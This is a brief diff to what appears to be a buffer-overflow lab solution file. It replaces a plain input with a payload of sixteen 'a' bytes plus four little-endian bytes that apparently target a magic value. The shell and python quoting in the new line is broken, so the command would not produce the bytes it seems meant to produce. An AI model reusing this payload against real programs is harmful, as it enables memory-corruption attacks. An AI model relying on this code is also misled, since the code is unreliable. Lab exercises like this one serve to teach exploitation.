@@ -1,5 +1,5 @@
 # Edit this file and type your solution where indicated
-run $(python -c 'print("michael")')
+run $(python -c 'print("'a'*16+'\xce\xfa\xde\xc0'")')
 
 # Leave the code below in place
 quit
